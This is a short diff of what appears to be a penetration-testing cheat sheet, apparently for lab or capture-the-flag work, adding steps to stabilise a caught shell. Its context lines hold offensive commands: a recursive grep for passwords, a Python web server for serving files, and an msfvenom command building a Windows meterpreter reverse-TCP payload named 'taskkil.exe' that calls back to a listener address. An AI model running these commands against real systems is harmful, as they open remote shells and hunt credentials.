@@ -136,7 +136,16 @@ sudo -l
 #Searching for string in files
 grep -Ri password .
 
-USEFULL COMMANDS.ps1
+USEFULL COMMANDS
+#fix shell
+echo $TERM
+stty -a
+^Z + stty raw -echo + fg + reset
+export SHELL=bash
+export TERM=xterm256-color
+stty rows 24 columns 80
+
+
 tcpdump -i tun0 icmp
 python -m SimpleHTTPServer 80
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=51251 -f exe -o taskkil.exe
